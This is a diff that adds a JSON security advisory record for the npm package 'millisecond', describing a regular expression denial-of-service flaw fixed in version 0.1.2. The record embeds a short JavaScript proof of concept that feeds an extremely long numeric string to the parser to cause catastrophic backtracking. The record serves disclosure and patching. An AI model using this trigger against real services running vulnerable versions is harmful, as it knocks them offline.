@@ -1,0 +1,23 @@
+{
+  "name": "millisecond",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-m489-xr35-fjxr",
+      "title": "Regular Expression Denial of Service in millisecond",
+      "description": "Versions of `millisecond` prior to 0.1.2 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.\n\n\n## Proof of concept\n```\nvar ms = require('millisecond');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n```\n\n\n## Recommendation\n\nUpdate to version 0.1.2 or later.",
+      "severity": "medium",
+      "url": "https://github.com/advisories/GHSA-m489-xr35-fjxr",
+      "publishedAt": "2021-09-22T20:35:08Z",
+      "modifiedAt": "2023-01-09T05:05:48Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-m489-xr35-fjxr"
+        }
+      ],
+      "affectedRange": "< 0.1.2",
+      "fixedVersion": "0.1.2"
+    }
+  ]
+}
